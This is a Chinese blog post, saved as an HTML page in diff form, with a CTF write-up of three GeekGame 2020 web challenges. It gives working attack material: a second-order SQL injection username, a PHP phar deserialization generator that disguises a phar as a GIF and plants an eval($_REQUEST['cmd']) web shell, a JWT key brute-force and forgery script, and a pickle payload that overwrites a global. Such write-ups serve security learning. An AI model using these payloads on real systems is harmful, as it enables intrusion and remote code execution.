@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="noodp" name="robots"/>
+<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible"/>
+<title>GeekGame 2020 WEB 复现 - X5tar's Blog</title><meta content="" name="Description"/><meta content="GeekGame 2020 WEB 复现" property="og:title"/>
+<meta content="前言 被川大的同学叫来打这个比赛 嗯没错这次比赛非常神奇，水出来的 RE 和 Crypto 都比 WEB 多… 比赛的时候就做出来一道 WEB（真的菜 二次注入 真的" property="og:description"/>
+<meta content="article" property="og:type"/>
+<meta content="https://x5tar.com/posts/geekgame2020/" property="og:url"/><meta content="posts" property="article:section"/>
+<meta content="2020-05-27T16:57:49+08:00" property="article:published_time"/>
+<meta content="2020-05-27T16:57:49+08:00" property="article:modified_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="GeekGame 2020 WEB 复现" name="twitter:title"/>
+<meta content="前言 被川大的同学叫来打这个比赛 嗯没错这次比赛非常神奇，水出来的 RE 和 Crypto 都比 WEB 多… 比赛的时候就做出来一道 WEB（真的菜 二次注入 真的" name="twitter:description"/>
+<meta content="X5tar's Blog" name="application-name"/>
+<meta content="X5tar's Blog" name="apple-mobile-web-app-title"/><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+<link href="/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
+<link href="/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/><link href="/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/><link href="/site.webmanifest" rel="manifest"/><link href="https://x5tar.com/posts/geekgame2020/" rel="canonical"/><link href="https://x5tar.com/posts/source-command/" rel="prev"/><link href="https://x5tar.com/posts/linux-crontab/" rel="next"/><link href="/lib/normalize/normalize.min.css" rel="stylesheet"/><link href="/css/style.min.css" rel="stylesheet"/><link href="/lib/fontawesome-free/all.min.css" rel="stylesheet"/><link href="/lib/animate/animate.min.css" rel="stylesheet"/><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "GeekGame 2020 WEB 复现",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/x5tar.com\/posts\/geekgame2020\/"
+        },"genre": "posts","keywords": "WriteUp","wordcount":  1057 ,
+        "url": "https:\/\/x5tar.com\/posts\/geekgame2020\/","datePublished": "2020-05-27T16:57:49+08:00","dateModified": "2020-05-27T16:57:49+08:00","publisher": {
+            "@type": "Organization",
+            "name": "X5tar"},"author": {
+                "@type": "Person",
+                "name": "X5tar"
+            },"description": ""
+    }
+    </script></head>
+<body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+<div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+<div class="header-wrapper">
+<div class="header-title">
+<a href="/" title="X5tar's Blog">X5tar's Blog</a>
+</div>
+<div class="menu">
+<div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+<input id="search-input-desktop" placeholder="搜索文章标题或内容..." type="text"/>
+<a class="search-button search-toggle" href="javascript:void(0);" id="search-toggle-desktop" title="搜索">
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a class="search-button search-clear" href="javascript:void(0);" id="search-clear-desktop" title="清空">
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id="search-loading-desktop">
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</span><a class="menu-item theme-switch" href="javascript:void(0);" title="切换主题">
+<i class="fas fa-adjust fa-fw"></i>
+</a>
+</div>
+</div>
+</div>
+</header><header class="mobile" id="header-mobile">
+<div class="header-container">
+<div class="header-wrapper">
+<div class="header-title">
+<a href="/" title="X5tar's Blog">X5tar's Blog</a>
+</div>
+<div class="menu-toggle" id="menu-toggle-mobile">
+<span></span><span></span><span></span>
+</div>
+</div>
+<div class="menu" id="menu-mobile"><div class="search-wrapper">
+<div class="search mobile" id="search-mobile">
+<input id="search-input-mobile" placeholder="搜索文章标题或内容..." type="text"/>
+<a class="search-button search-toggle" href="javascript:void(0);" id="search-toggle-mobile" title="搜索">
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a class="search-button search-clear" href="javascript:void(0);" id="search-clear-mobile" title="清空">
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id="search-loading-mobile">
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</div>
+<a class="search-cancel" href="javascript:void(0);" id="search-cancel-mobile">
+                        取消
+                    </a>
+</div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item theme-switch" href="javascript:void(0);" title="切换主题">
+<i class="fas fa-adjust fa-fw"></i>
+</a></div>
+</div>
+</header>
+<div class="search-dropdown desktop">
+<div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+<div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+<div class="container"><div class="toc" id="toc-auto">
+<h2 class="toc-title">目录</h2>
+<div class="toc-content" id="toc-content-auto"></div>
+</div><article class="page single"><h1 class="single-title animated flipInX">GeekGame 2020 WEB 复现</h1><div class="post-meta">
+<div class="post-meta-line"><span class="post-author"><a class="author" href="/" rel="author" title="Author"><i class="fas fa-user-circle fa-fw"></i>X5tar</a></span> <span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+<div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i> <time datetime="2020-05-27">2020-05-27</time> <i class="fas fa-pencil-alt fa-fw"></i> 约 1057 字 
+                <i class="far fa-clock fa-fw"></i> 预计阅读 3 分钟 </div>
+</div><div class="details toc" id="toc-static" kept="">
+<div class="details-summary toc-title">
+<span>目录</span>
+<span><i class="details-icon fas fa-angle-right"></i></span>
+</div>
+<div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+<ul>
+<li><a href="#前言">前言</a></li>
+<li><a href="#二次注入">二次注入</a></li>
+<li><a href="#反序列化">反序列化？</a></li>
+<li><a href="#ezcode">ezcode</a></li>
+<li><a href="#总结">总结</a></li>
+</ul>
+</nav></div>
+</div><div class="content" id="content"><h2 id="前言">前言</h2>
+<p>被川大的同学叫来打这个比赛</p>
+<p>嗯没错这次比赛非常神奇，水出来的 RE 和 Crypto 都比 WEB 多…</p>
+<p>比赛的时候就做出来一道 WEB（真的菜</p>
+<h2 id="二次注入">二次注入</h2>
+<p>真的是这次比赛最简单的一道题了</p>
+<p>最常规的二次注入</p>
+<p>先注册一个名为 <code>admin'#</code> 的用户，登录后修改密码</p>
+<p>再用 <code>admin</code> 和修改后的密码登录即可</p>
+<blockquote>
+<p>比赛的时候没发现有源码泄露，直接看 SQL 语句可能更直观一些</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$x</span><span class="o">=</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="s2">"update users set password=? where username='</span><span class="si">$username</span><span class="s2">' "</span><span class="p">,[</span><span class="s1">'s'</span><span class="p">,</span><span class="o">&amp;</span><span class="nv">$password</span><span class="p">]);</span>
+</code></pre></td></tr></table>
+</div>
+</div></blockquote>
+<h2 id="反序列化">反序列化？</h2>
+<p>打开是个文件上传，只能上传图片，并且有个 <code>vulnerable.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$filename</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">Flag</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$code</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="c1">// TODO: Implement __destruct() method.
+</span><span class="c1"></span>        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"文件存在的呢;"</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"啊这，文件不在哦"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>题名加了个问号，那就不是反序列化，但是还不知道怎么做</p>
+<p>看了官方 WP，这真的涉及到我的知识盲区了</p>
+<p><code>vulnerable.php</code> 中用到了 <code>file_exists</code> 函数</p>
+<blockquote>
+<p>自 PHP 5.0.0 起, 此函数也用于某些 URL 包装器</p>
+<p><code>file_exists</code>函数在检查 phar 包的时候会将其解析</p>
+</blockquote>
+<p>用如下 payload 生成 phar 包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+
+<span class="k">class</span> <span class="nc">Flag</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$code</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$my_code</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span> <span class="o">=</span> <span class="nv">$my_code</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+
+<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">'a.phar'</span><span class="p">);</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">'GIF89a&lt;?php __HALT_COMPILER();?&gt;'</span><span class="p">);</span>
+<span class="nv">$object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Flag</span><span class="p">(</span><span class="s1">'eval($_REQUEST["cmd"]);'</span><span class="p">);</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$object</span><span class="p">);</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">'a.txt'</span><span class="p">,</span> <span class="s1">'a'</span><span class="p">);</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>注意添加文件头绕过文件类型检测，生成后改后缀为 gif 上传，再用 phar 协议读取即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">vulnerable.php?filename=phar://upload/a.gif
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="ezcode">ezcode</h2>
+<p>直到比赛结束只有一解的题</p>
+<p>打开可以注册和登录，注册返回一串 JWT，刚开始毫无思路，后来给了一个 hint</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">hint ：top1000
+</code></pre></td></tr></table>
+</div>
+</div><p>？top1000 弱口令吗</p>
+<p>跑了一下果然跑出来了 key</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">jwt</span>
+
+<span class="n">token</span> <span class="o">=</span> <span class="s1">'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEyMzQifQ.f_U2qBN5qFbsWyIQhfIGYw2aDzX1QTKefGn-QuZ8FIw'</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'top1000.txt'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">top1000</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">top1000</span><span class="p">:</span>
+    <span class="n">test_token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span><span class="s1">'username'</span><span class="p">:</span><span class="s1">'1234'</span><span class="p">},</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">'HS256'</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">test_token</span> <span class="o">==</span> <span class="n">token</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">'Found it!'</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span><span class="s1">'username'</span><span class="p">:</span><span class="s1">'admin'</span><span class="p">},</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">'HS256'</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+        <span class="k">break</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;爆破 JWT Key 并修改内容&lt;/h2&gt;&lt;p&gt;JWT&lt;/p&gt;" data-thumbnail="/posts/geekgame2020/JWT.png" href="/posts/geekgame2020/JWT.png" title="JWT">
+<img alt="/posts/geekgame2020/JWT.png" class="lazyload" data-sizes="auto" data-src="JWT.png" data-srcset="/posts/geekgame2020/JWT.png, JWT.png 1.5x, /posts/geekgame2020/JWT.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">爆破 JWT Key 并修改内容</figcaption>
+</figure></p>
+<p>用生成的 JWT 登录发现还有第二关，看一下源码有注释</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">want2know</span><span class="o">=</span><span class="n">xxx</span>
+
+<span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
+    <span class="n">blacklist</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">'sys'</span><span class="p">,</span><span class="s1">'eval'</span><span class="p">,</span> <span class="s1">'exec'</span><span class="p">,</span> <span class="s1">'execfile'</span><span class="p">,</span> <span class="s1">'compile'</span><span class="p">,</span> <span class="s1">'open'</span><span class="p">,</span> <span class="s1">'input'</span><span class="p">,</span> <span class="s1">'__import__'</span><span class="p">,</span> <span class="s1">'exit'</span><span class="p">,</span><span class="s1">'getattr'</span>
+        <span class="p">}</span>
+
+    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+        <span class="c1"># Only allow safe classes from builtins.</span>
+        <span class="k">if</span> <span class="n">module</span> <span class="o">==</span> <span class="s2">"builtins"</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">blacklist</span><span class="p">:</span>
+            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+        <span class="c1"># Forbid everything else.</span>
+        <span class="k">raise</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="s2">"global '</span><span class="si">%s</span><span class="s2">.</span><span class="si">%s</span><span class="s2">' is forbidden"</span> <span class="o">%</span>
+                                     <span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">restricted_loads</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">RestrictedUnpickler</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">s</span><span class="p">))</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
+
+<span class="o">...</span>
+
+        <span class="n">pickle_data</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'data'</span><span class="p">)</span>
+        
+        <span class="k">if</span> <span class="n">pickle_data</span><span class="o">==</span><span class="bp">None</span><span class="p">:</span>
+            <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'templates/pickle.html'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">pickle_data</span><span class="o">=</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">pickle_data</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+
+            <span class="n">op_blackli</span><span class="o">=</span><span class="p">[</span><span class="sa">b</span><span class="s1">'R'</span><span class="p">]</span>
+
+            <span class="k">for</span> <span class="n">op</span> <span class="ow">in</span> <span class="n">op_blackli</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">op</span> <span class="ow">in</span> <span class="n">pickle_data</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="s1">'数据非法！'</span><span class="o">+</span><span class="n">op</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+            <span class="n">data</span><span class="o">=</span><span class="n">restricted_loads</span><span class="p">(</span><span class="n">pickle_data</span><span class="p">)</span>
+
+        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+            
+            <span class="k">return</span> <span class="s2">"请输入正确的数据格式！"</span>
+
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">secret</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'secret'</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+            <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'templates/pickle.html'</span><span class="p">)</span>
+        
+        <span class="k">if</span> <span class="n">want2know</span><span class="o">==</span><span class="n">secret</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">flag</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s1">'欢迎使用HACHp1的pickle测试工具！'</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s1">'没有权限查看！</span><span class="se">\n</span><span class="s1">'</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>是一个 pickle 反序列化，只看出来禁止用 <code>R</code> 执行函数，然后就不会了（</p>
+<p>看了 WP 这里是利用 <code>globals</code> 或 <code>locals</code> 函数直接修改 <code>want2know</code> 使其与输入的 <code>secret</code> 相等</p>
+<p>出题壬推荐用 <a href="https://github.com/eddieivan01/pker" rel="noopener noreffer" target="_blank">pker</a> 构建序列化</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">glo_dic</span><span class="o">=</span><span class="n">INST</span><span class="p">(</span><span class="s1">'builtins'</span><span class="p">,</span><span class="s1">'globals'</span><span class="p">)</span>
+<span class="n">glo_dic</span><span class="p">[</span><span class="s1">'want2know'</span><span class="p">]</span><span class="o">=</span><span class="s1">'test'</span>
+<span class="k">return</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>生成 payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">b"(ibuiltins\nglobals\np0\n0g0\nS'want2know'\nS'test'\ns."
+</code></pre></td></tr></table>
+</div>
+</div><p>base64 一下即可</p>
+<h2 id="总结">总结</h2>
+<p>第一道 WEB 比较照顾我这样的菜🐶</p>
+<p>后两道 WEB 质量还是不错的，都涉及到了我不会的知识点</p>
+<p>phar 和 pickle 似乎都是第一次做到</p>
+<p>除了做不出来，体验挺不错的（</p>
+</div><div class="post-footer" id="post-footer">
+<div class="post-info">
+<div class="post-info-line">
+<div class="post-info-mod">
+<span>更新于 2020-05-27</span>
+</div>
+<div class="post-info-license"></div>
+</div>
+<div class="post-info-line">
+<div class="post-info-md"><span>
+<a class="link-to-markdown" href="/posts/geekgame2020/index.md" target="_blank">阅读原始文档</a>
+</span></div>
+<div class="post-info-share">
+<span></span>
+</div>
+</div>
+</div>
+<div class="post-info-more">
+<section class="post-tags"><i class="fas fa-tags fa-fw"></i> <a href="/tags/writeup/">WriteUp</a></section>
+<section>
+<span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span> | <span><a href="/">主页</a></span>
+</section>
+</div>
+<div class="post-nav"><a class="prev" href="/posts/source-command/" rel="prev" title="Linux 中的 source 命令（点命令）"><i class="fas fa-angle-left fa-fw"></i>Linux 中的 source 命令（点命令）</a>
+<a class="next" href="/posts/linux-crontab/" rel="next" title="Linux Cron 定时任务">Linux Cron 定时任务<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div class="comment" id="valine"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+</main><footer class="footer">
+<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.83.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder"> <a href="/" target="_blank">X5tar</a></span></div>
+</div>
+</footer></div>
+<div id="fixed-buttons"><a class="fixed-button" href="#" id="back-to-top" title="回到顶部">
+<i class="fas fa-arrow-up fa-fw"></i>
+</a><a class="fixed-button" href="#" id="view-comments" title="查看评论">
+<i class="fas fa-comment fa-fw"></i>
+</a>
+</div><link href="/lib/valine/valine.min.css" rel="stylesheet"/><link href="/lib/lightgallery/lightgallery.min.css" rel="stylesheet"/><script src="/lib/valine/Valine.min.js" type="text/javascript"></script><script src="/lib/smooth-scroll/smooth-scroll.min.js" type="text/javascript"></script><script src="/lib/autocomplete/autocomplete.min.js" type="text/javascript"></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" type="text/javascript"></script><script src="/lib/lazysizes/lazysizes.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lightgallery.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lg-thumbnail.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lg-zoom.min.js" type="text/javascript"></script><script src="/lib/clipboard/clipboard.min.js" type="text/javascript"></script><script 